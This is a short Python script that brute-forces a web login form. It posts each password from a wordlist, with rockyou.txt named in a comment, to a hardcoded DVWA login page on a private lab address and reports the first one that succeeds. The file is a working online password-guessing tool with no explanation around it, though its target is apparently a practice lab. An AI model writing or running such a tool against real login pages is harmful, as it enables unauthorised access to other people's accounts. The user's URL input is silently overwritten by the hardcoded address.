#!/usr/bin/python
import requests
import os
class PasswordCracker():
    def __init__(self):
        print("Launching Password Cracker")
    def Crack(self,username,url):
        for password in passwords:
            password = password.strip()
            print(f"[+] Using the password {password}")
            data = {
                "username":username,
                "password":password,
                "Login":"submit"
            }
            #submit the data using the requests library
            response = requests.post(url, data)
            if "Login failed" in response.text:
                pass
            else:
                print(f"[+] Login Successful with the Username:{username} and password:{password}\n" )
                break;
    



try:
    cracker = PasswordCracker()
    bruteforcing_url = input("Enter the Url path to the page you want to crack the passwords for")
    bruteforcing_url ="http://172.16.171.128/dvwa/login.php"
    username = input("Enter the Username\n")
    password_file = input("Enter the path to the password file\n")
    # password_file = "/home/p1rate/Desktop/rockyou.txt"
    #load the passwords file into the memory 
    with open(password_file,'r') as passwords:
        cracker.Crack(username,bruteforcing_url)
        #call the cracker function 
except KeyboardInterrupt:
    print("[-] Terminated by User")
    exit()